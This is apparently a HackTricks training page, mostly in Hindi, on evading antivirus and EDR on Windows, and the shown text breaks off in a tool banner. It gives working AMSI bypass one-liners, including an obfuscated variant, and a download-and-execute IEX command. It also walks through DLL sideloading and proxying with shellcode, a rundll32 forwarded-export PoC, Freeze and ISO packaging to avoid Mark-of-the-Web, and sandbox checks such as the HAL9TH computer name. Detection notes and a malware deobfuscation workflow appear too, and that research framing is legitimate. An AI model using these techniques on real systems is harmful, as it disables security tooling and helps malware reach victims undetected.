# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पृष्ठ लिखा गया था** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करना बंद कराने का एक टूल।
- [no-defender](https://github.com/es3n1n/no-defender): एक टूल जो दूसरे AV की नकल करके Windows Defender को काम करना बंद कर देता है।
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

वर्तमान में, AVs फाइल को malicious है या नहीं यह जाँचने के लिए अलग‑अलग तरीके इस्तेमाल करते हैं: static detection, dynamic analysis, और अधिक उन्नत EDRs के लिए behavioural analysis।

### **Static detection**

Static detection बाइनरी या स्क्रिप्ट में ज्ञात malicious strings या byte arrays को पहचानकर और फाइल से खुद जानकारी निकालकर (जैसे file description, company name, digital signatures, icon, checksum, आदि) हासिल की जाती है। इसका मतलब है कि सार्वजनिक रूप से उपलब्ध टूल्स का उपयोग आपको ज़्यादा आसानी से पकड़ा सकता है, क्योंकि उन्हें शायद पहले ही analyze करके malicious के रूप में चिह्नित कर दिया गया है। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

यदि आप बाइनरी को encrypt कर देंगे, तो AV के लिए आपका program detect करना कठिन होगा, लेकिन आपको किसी तरह का loader चाहिए होगा जो प्रोग्राम को memory में decrypt और run करे।

- **Obfuscation**

कभी‑कभी बस अपनी बाइनरी या स्क्रिप्ट में कुछ strings बदल देने से AV को पार किया जा सकता है, लेकिन यह काम उस पर निर्भर करते हुए समय‑साध्य हो सकता है जिसे आप obfuscate कर रहे हैं।

- **Custom tooling**

यदि आप अपने खुद के tools विकसित करते हैं, तो कोई ज्ञात bad signatures नहीं होंगे, लेकिन इसमें बहुत समय और मेहनत लगती है।

> [!TIP]
> Windows Defender की static detection के खिलाफ चेक करने का एक अच्छा तरीका है [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)। यह मूलतः फाइल को कई segments में बाँट देता है और फिर Defender से प्रत्येक segment अलग से scan करने को कहता है; इस तरह यह आपको बता सकता है कि आपकी बाइनरी में कौन‑से specific flagged strings या bytes हैं।

मैं सुझाव देता/देती हूँ कि आप इस [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) को देखें जो practical AV Evasion के बारे में है।

### **Dynamic analysis**

Dynamic analysis वह है जब AV आपकी बाइनरी को एक sandbox में चला कर malicious गतिविधियों (उदा. ब्राउज़र के passwords decrypt करके पढ़ना, LSASS का minidump लेना, आदि) पर नज़र रखता है। यह हिस्सा थोड़ा मुश्किल हो सकता है, लेकिन sandboxes से बचने के लिए आप कुछ चीजें कर सकते हैं।

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AVs के पास files को scan करने का बहुत छोटा समय होता है ताकि उपयोगकर्ता के workflow में व्यवधान न आए, इसलिए लंबे sleeps का उपयोग binaries की analysis को प्रभावित कर सकता है। समस्या यह है कि कई AVs के sandboxes sleep को skip कर सकते हैं यह इस पर निर्भर करता है कि इसे कैसे implement किया गया है।
- **Checking machine's resources** आमतौर पर Sandboxes के पास काम के लिए बहुत कम resources होते हैं (उदा. < 2GB RAM), वरना वे उपयोगकर्ता की मशीन को धीमा कर देंगे। आप यहाँ काफी creative भी हो सकते हैं, उदाहरण के लिए CPU के temperature या fan speeds की जाँच करके — हर चीज़ sandbox में implement नहीं होती।
- **Machine-specific checks** यदि आप किसी ऐसे उपयोगकर्ता को target करना चाहते हैं जिसका workstation "contoso.local" domain से जुड़ा है, तो आप कंप्यूटर के domain की जाँच कर सकते हैं कि क्या यह आपके specified domain से मेल खाता है; अगर नहीं, तो आपका प्रोग्राम exit कर सकता है।

पता चला है कि Microsoft Defender का Sandbox computername HAL9TH है, इसलिए आप अपना malware detonate करने से पहले कंप्यूटर का नाम चेक कर सकते हैं — अगर नाम HAL9TH से मेल खाता है, तो इसका मतलब है कि आप defender के sandbox के अंदर हैं, और आप अपना प्रोग्राम exit करवा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के खिलाफ जाने के लिए [@mgeeky](https://twitter.com/mariuszbit) की कुछ और बहुत अच्छी टिप्स:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने इस पोस्ट में पहले कहा है, सार्वजनिक tools अंततः detect हो ही जाएंगे, तो आपको खुद से एक सवाल पूछना चाहिए:

उदाहरण के लिए, अगर आप LSASS dump करना चाहते हैं, तो क्या आपको वाकई में mimikatz का उपयोग करना जरूरी है? या क्या आप कोई ऐसा project इस्तेमाल कर सकते हैं जो कम‑प्रसिद्ध हो और वही LSASS dump कर दे।

सही जवाब शायद बाद वाला है। mimikatz को उदाहरण के तौर पर लें — यह शायद AVs और EDRs द्वारा सबसे ज्यादा flagged किए जाने वाले टूल्स में से एक है; जबकि प्रोजेक्ट अपने आप में बहुत अच्छा है, यह AVs को चकमा देने के मामले में काम करने में एकNightmare भी हो सकता है, इसलिए जो आप हासिल करना चाहते हैं उसके लिए विकल्प ढूँढें।

> [!TIP]
> जब आप अपने payloads को evasion के लिए modify कर रहे हों, तो सुनिश्चित करें कि Defender में automatic sample submission बंद है, और कृपया गंभीरता से, लंबी अवधि में evasion प्राप्त करना आपका लक्ष्य है तो VIRUSTOTAL पर UPLOAD न करें। यदि आप देखना चाहते हैं कि आपका payload किसी particular AV द्वारा detect होता है या नहीं, तो उसे एक VM पर install करें, automatic sample submission बंद करने की कोशिश करें, और वहाँ तब तक टेस्ट करें जब तक आप परिणाम से संतुष्ट न हों।

## EXEs vs DLLs

जब भी संभव हो, हमेशा evasion के लिए DLLs का उपयोग प्राथमिकता दें; मेरे अनुभव में, DLL फाइलें आमतौर पर बहुत कम detect और analyze की जाती हैं, इसलिए यह कुछ मामलों में detection से बचने के लिए एक बहुत ही सरल ट्रिक है (यदि आपका payload किसी तरह से DLL के रूप में चल सकता हो तो)।

जैसा कि हम इस इमेज में देख सकते हैं, Havoc का एक DLL Payload antiscan.me पर 4/26 detection rate दिखाता है, जबकि EXE payload का detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

अब हम कुछ ऐसे ट्रिक्स दिखाएंगे जो आप DLL फाइलों के साथ इस्तेमाल कर सकते हैं ताकि आप और भी अधिक stealthy बन सकें।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा उपयोग किए जाने वाले DLL search order का फायदा उठाता है, जिसमें victim application और malicious payload(s) को एक दूसरे के साथ रखकर इस्तेमाल किया जाता है।

आप [Siofra](https://github.com/Cybereason/siofra) और नीचे दिए गए powershell script का उपयोग करके DLL Sideloading के प्रति susceptible programs की जाँच कर सकते हैं:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
यह कमांड "C:\Program Files\\" के भीतर DLL hijacking के प्रति संवेदनशील programs की सूची और वे किन DLL फाइलों को लोड करने की कोशिश करते हैं, यह आउटपुट करेगा।

मैं दृढ़ता से सुझाव देता/देती हूँ कि आप **explore DLL Hijackable/Sideloadable programs yourself**, यह technique यदि सही ढंग से किया जाए तो काफी stealthy होता है, पर यदि आप publicly known DLL Sideloadable programs का उपयोग करेंगे तो पकड़े जाने की संभावना बढ़ जाती है।

सिर्फ किसी program के अपेक्षित नाम वाली malicious DLL रख देने भर से आपका payload नहीं चलेगा, क्योंकि program उस DLL के अंदर कुछ specific functions की उम्मीद करता है; इस समस्या को हल करने के लिए हम एक और technique जिसका नाम **DLL Proxying/Forwarding** है, उपयोग करेंगे।

**DLL Proxying** proxy (and malicious) DLL से original DLL को program द्वारा किए गए calls को आगे भेजता है, इस तरह program की functionality बनी रहती है और आपके payload के execution को संभाला जा सकता है।

मैं [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project का उपयोग करूँगा/करूँगी जो [@flangvik](https://twitter.com/Flangvik/) द्वारा है।

ये वे कदम हैं जो मैंने उठाए:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
आखिरी कमांड हमें 2 फ़ाइलें देगा: एक DLL source code template, और मूल पुनर्नामित DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं **दृढ़ता से सुझाव देता हूँ** कि आप [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) जो DLL Sideloading के बारे में है देखें और साथ ही [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) भी देखें ताकि हमने जो बात की है उसको और अधिक गहराई में समझ सकें।

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules ऐसे functions export कर सकते हैं जो दरअसल "forwarders" होते हैं: कोड की ओर इशारा करने के बजाय, export entry में `TargetDll.TargetFunc` के रूप में एक ASCII string होती है। जब कोई caller उस export को resolve करता है, तो Windows loader:

- Load `TargetDll` यदि यह पहले से loaded नहीं है
- उससे `TargetFunc` को resolve करेगा

समझने के लिए प्रमुख व्यवहार:
- यदि `TargetDll` एक KnownDLL है, तो यह protected KnownDLLs namespace से प्रदान किया जाता है (उदा., ntdll, kernelbase, ole32).
- यदि `TargetDll` KnownDLL नहीं है, तो सामान्य DLL search order प्रयोग में लाया जाता है, जिसमें उस module की directory भी शामिल है जो forward resolution कर रहा है।

यह एक indirect sideloading primitive को सक्षम करता है: एक signed DLL खोजें जो ऐसी function export करता हो जिसे non-KnownDLL module name की ओर forward किया गया हो, फिर उस signed DLL को उसी directory में रखें जहाँ एक attacker-controlled DLL हो जिसका नाम forwarded target module के बिल्कुल समान हो। जब forwarded export invoke किया जाता है, loader forward को resolve करता है और उसी directory से आपकी DLL को लोड करता है, जिससे आपकी DllMain execute होती है।

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` KnownDLL नहीं है, इसलिए इसे सामान्य खोज क्रम के माध्यम से हल किया जाता है।

PoC (कॉपी-पेस्ट):
1) साइन किए गए सिस्टम DLL को एक लिखने योग्य फ़ोल्डर में कॉपी करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक दुर्भावनापूर्ण `NCRYPTPROV.dll` रखें। एक न्यूनतम DllMain code execution पाने के लिए पर्याप्त है; DllMain को trigger करने के लिए forwarded function को implement करने की आवश्यकता नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) साइन किए गए LOLBin के साथ फॉरवर्ड ट्रिगर करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
प्रेक्षित व्यवहार:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) को लोड करता है
- जब `KeyIsoSetAuditingInterface` को resolve किया जा रहा है, तो loader forward को फॉलो करके `NCRYPTPROV.SetAuditingInterface` पर जाता है
- उसके बाद loader `NCRYPTPROV.dll` को `C:\test` से लोड करता है और इसकी `DllMain` को execute करता है
- अगर `SetAuditingInterface` implemented नहीं है, तो आपको "missing API" error केवल तब मिलेगा जब `DllMain` पहले ही चल चुका होगा

Hunting tips:
- उन forwarded exports पर ध्यान दें जहाँ target module KnownDLL नहीं है। KnownDLLs सूची `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के अंतर्गत दी गई है।
- आप forwarded exports को enumerate करने के लिए निम्न tooling का उपयोग कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- उम्मीदवार खोजने के लिए Windows 11 forwarder इन्वेंटरी देखें: https://hexacorn.com/d/apis_fwd.txt

डिटेक्शन/रक्षा के विचार:
- LOLBins (e.g., rundll32.exe) के उन मामलों पर निगरानी रखें जहाँ यह non-system paths से signed DLLs लोड करता है, और फिर उसी डायरेक्टरी से उसी base name वाले non-KnownDLLs को लोड करता है
- निम्नलिखित process/module श्रृंखलाओं पर अलर्ट करें: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
- code integrity policies (WDAC/AppLocker) लागू करें और application डायरेक्टरीज़ में write+execute को अस्वीकार करें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

आप Freeze का उपयोग अपने shellcode को गुप्त तरीके से लोड और निष्पादित करने के लिए कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion बस एक बिल्ली और चूहे का खेल है, जो आज काम करता है वह कल डिटेक्ट हो सकता है, इसलिए केवल एक ही टूल पर भरोसा मत करो — अगर संभव हो तो multiple evasion techniques को chain करने की कोशिश करो।

## AMSI (Anti-Malware Scan Interface)

AMSI को "fileless malware" को रोकने के लिए बनाया गया था. शुरुआत में, AVs केवल डिस्क पर मौजूद फाइलों को स्कैन कर पाते थे, इसलिए अगर आप किसी तरह payloads को directly in-memory execute कर देते थे, तो AV कुछ भी करने में असमर्थ था क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

The AMSI feature Windows के इन components में integrated है।

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

यह antivirus solutions को script behavior inspect करने की अनुमति देता है क्योंकि यह script contents को एक ऐसी form में expose करता है जो unencrypted और unobfuscated होती है।

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` Windows Defender पर निम्न alert पैदा करेगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` को prepend करता है और फिर उस executable का path दिखाता है जिससे script run हुआ था — इस case में, powershell.exe

हमने कोई फाइल disk पर drop नहीं की, पर फिर भी in-memory में AMSI की वजह से पकड़े गए।

इसके अलावा, .NET 4.8 से शुरू होकर, C# code भी AMSI के माध्यम से run होता है। यह `Assembly.Load(byte[])` जैसी in-memory execution को भी प्रभावित करता है। इसलिए यदि आप AMSI से बचना चाहते हैं तो lower versions of .NET (जैसे 4.7.2 या नीचे) का उपयोग करने की सलाह दी जाती है।

There are a couple of ways to get around AMSI:

- **Obfuscation**

चूंकि AMSI मुख्यतः static detections पर काम करता है, इसलिए जिन scripts को आप load करने की कोशिश कर रहे हैं उन्हें modify करना detection से बचने का एक अच्छा तरीका हो सकता है।

हालाँकि, AMSI के पास scripts को multiple layers होने पर भी unobfuscate करने की capability है, इसलिए obfuscation कभी-कभी एक खराब विकल्प हो सकता है — यह निर्भर करता है कि इसे कैसे किया गया है। इससे इसे evade करना हमेशा straightforward नहीं होता। हालांकि कभी-कभी बस कुछ variable names बदल देने से भी काम चल जाता है, इसलिए यह इस पर निर्भर करता है कि कितना कुछ flagged हुआ है।

- **AMSI Bypass**

AMSI को powershell (और cscript.exe, wscript.exe, आदि) process में एक DLL लोड करके implement किया गया है, इसलिए unprivileged user के रूप में भी इसे tamper करना आसान है। AMSI की इस implementation flaw की वजह से researchers ने AMSI scanning को evade करने के कई तरीके ढूंढे हैं।

Forcing an Error

AMSI initialization को fail होने के लिए मजबूर करना (amsiInitFailed) इस परिणाम में होगा कि current process के लिए कोई scan initiate नहीं होगा। Originally यह Matt Graeber द्वारा disclose किया गया था और Microsoft ने इसके व्यापक उपयोग को रोकने के लिए एक signature विकसित किया है।
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
एक ही powershell कोड की लाइन ने वर्तमान powershell प्रक्रिया के लिए AMSI को अनुपयोगी बना दिया। यह लाइन बेशक AMSI द्वारा स्वयं फ्लैग की जा चुकी है, इसलिए इस तकनीक का उपयोग करने के लिए कुछ संशोधन आवश्यक हैं।

यहाँ एक संशोधित AMSI bypass है जो मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
ध्यान रखें कि जब यह पोस्ट प्रकाशित होगी तो यह शायद फ्लैग हो जाएगा, इसलिए अगर आपकी योजना अनडिटेक्टेड रहना है तो आप किसी भी कोड को प्रकाशित न करें।

**Memory Patching**

यह तकनीक मूल रूप से [@RastaMouse](https://twitter.com/_RastaMouse/) द्वारा खोजी गई थी और इसमें amsi.dll में "AmsiScanBuffer" फ़ंक्शन का पता लगाना शामिल है (जो उपयोगकर्ता-प्रदान किए गए इनपुट की स्कैनिंग के लिए जिम्मेदार है) और उसे उन निर्देशों से ओवरराइट करना कि वह E_INVALIDARG को रिटर्न करे; इस तरह, वास्तविक स्कैन का परिणाम 0 लौटाएगा, जिसे साफ़ परिणाम के रूप में समझा जाता है।

> [!TIP]
> कृपया पढ़ें [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) अधिक विस्तृत व्याख्या के लिए।

AMSI को Powershell के साथ बायपास करने के लिए और भी कई तकनीकें हैं, इनके बारे में अधिक जानने के लिए [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) देखें।

यह टूल [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) भी AMSI को बायपास करने वाली स्क्रिप्ट जेनरेट करता है।

**डिटेक्ट की गई सिग्नेचर को हटाएँ**

आप वर्तमान प्रक्रिया की मेमोरी से डिटेक्ट की गई AMSI सिग्नेचर को हटाने के लिए जैसे टूल्स **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** का उपयोग कर सकते हैं। यह टूल वर्तमान प्रक्रिया की मेमोरी में AMSI सिग्नेचर को स्कैन करके उसे NOP इंस्ट्रक्शन्स से ओवरराइट कर देता है, जिससे वह प्रभावी रूप से मेमोरी से हटा दिया जाता है।

**AV/EDR products that uses AMSI**

आप AMSI का उपयोग करने वाले AV/EDR उत्पादों की सूची **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** पर पा सकते हैं।

**Powershell version 2 का उपयोग करें**
यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपनी स्क्रिप्ट्स को AMSI द्वारा स्कैन किए बिना चला सकते हैं। आप यह कर सकते हैं:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging एक ऐसी सुविधा है जो सिस्टम पर चलाए गए सभी PowerShell कमांड्स को लॉग करने की अनुमति देती है। यह ऑडिटिंग और समस्या निवारण के लिए उपयोगी हो सकती है, लेकिन यह उन attackers के लिए भी एक **समस्या हो सकती है जो detection से बचना चाहते हैं**।

PowerShell लॉगिंग को बायपास करने के लिए, आप निम्न तकनीकों का उपयोग कर सकते हैं:

- **Disable PowerShell Transcription and Module Logging**: आप इसके लिए [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे टूल का उपयोग कर सकते हैं।
- **Use Powershell version 2**: अगर आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपने scripts को AMSI द्वारा स्कैन किए बिना चला सकते हैं। आप ऐसा कर सकते हैं: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) to spawn a powershell withuot defenses (this is what `powerpick` from Cobal Strike uses).


## Obfuscation

> [!TIP]
> कई obfuscation techniques डेटा को encrypt करने पर निर्भर करती हैं, जो बाइनरी की entropy बढ़ा देगी और AVs और EDRs के लिए उसे detect करना आसान कर देगी। इसके बारे में सावधान रहें और शायद encryption केवल अपने कोड के उन हिस्सों पर लागू करें जो संवेदनशील हों या छिपाने की आवश्यकता हो।

### Deobfuscating ConfuserEx-Protected .NET Binaries

जब ConfuserEx 2 (या commercial forks) का उपयोग करने वाले malware का analysis किया जाता है, तो अक्सर कई सुरक्षा परतें मिलती हैं जो decompilers और sandboxes को ब्लॉक कर देती हैं। नीचे दिया गया workflow भरोसेमंद रूप से मूल IL के काफी नज़दीक एक स्थिति बहाल करता है जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और उसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch कर देता है इसलिए कोई भी modification बाइनरी को क्रैश कर देगा। Encrypted metadata tables ढूँढने, XOR keys recover करने और एक clean assembly rewrite करने के लिए **AntiTamperKiller** का उपयोग करें:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) होंगे जो अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* फाइल को **de4dot-cex** (de4dot का ConfuserEx-aware fork) को दें।
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile चुनें  
• de4dot control-flow flattening को undo करेगा, मूल namespaces, classes और variable names restore करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx decompilation को और तोड़ने के लिए direct method calls को lightweight wrappers (a.k.a *proxy calls*) से replace कर देता है। इन्हें हटाने के लिए **ProxyCall-Remover** का उपयोग करें:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
इस चरण के बाद आपको opaque wrapper functions (`Class8.smethod_10`, …) के बजाय सामान्य .NET API जैसे `Convert.FromBase64String` या `AES.Create()` दिखाई देने चाहिए।

4.  Manual clean-up – resulting binary को dnSpy में चलाएँ, बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग के लिए खोजें ताकि *real* payload का पता चल सके। अक्सर malware इसे TLV-encoded byte array के रूप में `<Module>.byte_0` के अंदर initialize करता है।

उपर्युक्त चेन execution flow को **बिना** malicious sample चलाए बहाल कर देता है — जब आप offline workstation पर काम कर रहे हों तब यह उपयोगी है।

> 🛈  ConfuserEx एक custom attribute `ConfusedByAttribute` उत्पन्न करता है जिसे IOC के रूप में samples को automatic तौर पर triage करने के लिए उपयोग किया जा सकता है।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस प्रोजेक्ट का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक open-source fork प्रदान करना है जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के माध्यम से सॉफ़्टवेयर सुरक्षा बढ़ा सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दर्शाता है कि `C++11/14` भाषा का उपयोग करके compile time पर obfuscated code कैसे generate किया जा सकता है, बिना किसी external tool का उपयोग किए और compiler को modify किए बिना।
- [**obfy**](https://github.com/fritzone/obfy): यह C++ template metaprogramming framework द्वारा उत्पन्न obfuscated operations की एक परत जोड़ता है, जो application को crack करने वाले व्यक्ति के लिए काम थोड़ा कठिन बना देगा।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है जो .exe, .dll, .sys सहित विभिन्न pe files को obfuscate कर सकता है।
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक सरल metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator एक fine-grained code obfuscation framework है जो LLVM-supported languages में ROP (return-oriented programming) का उपयोग करता है। ROPfuscator assembly code level पर प्रोग्राम को obfuscate करता है, सामान्य निर्देशों को ROP chains में बदलकर सामान्य control flow की हमारी प्राकृतिक धारणा को बाधित करता है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt Nim में लिखा गया एक .NET PE Crypter है
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूद EXE/DLL को shellcode में convert करके उन्हें load कर सकता है

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्यतः reputation-based approach से काम करता है, जिसका अर्थ है कि कम बार डाउनलोड किए गए applications SmartScreen को ट्रिगर करेंगे, जिससे end user को alert किया जाएगा और उसे file execute करने से रोका जाएगा (हालाँकि file को More Info -> Run anyway पर क्लिक करके फिर भी execute किया जा सकता है)।

**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है जिसका नाम Zone.Identifier होता है और यह internet से फाइलें डाउनलोड करने पर अपने आप बनाया जाता है, साथ में वह URL भी होता है जिससे इसे डाउनलोड किया गया था।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>internet से डाउनलोड की गई फाइल के लिए Zone.Identifier ADS की जाँच।</p></figcaption></figure>

> [!TIP]
> यह ध्यान रखना महत्वपूर्ण है कि executables जो एक **trusted** signing certificate से signed हैं, वे **SmartScreen को ट्रिगर नहीं करेंगे**।

एक बहुत प्रभावी तरीका ताकि आपके payloads को Mark of The Web न मिल सके, उन्हें किसी कंटेनर जैसे ISO के अंदर पैकेज करना है। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) **non NTFS** volumes पर लागू नहीं किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक tool है जो payloads को output containers में पैकेज करता है ताकि Mark-of-the-Web से बचा जा सके।

उदाहरण उपयोग:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
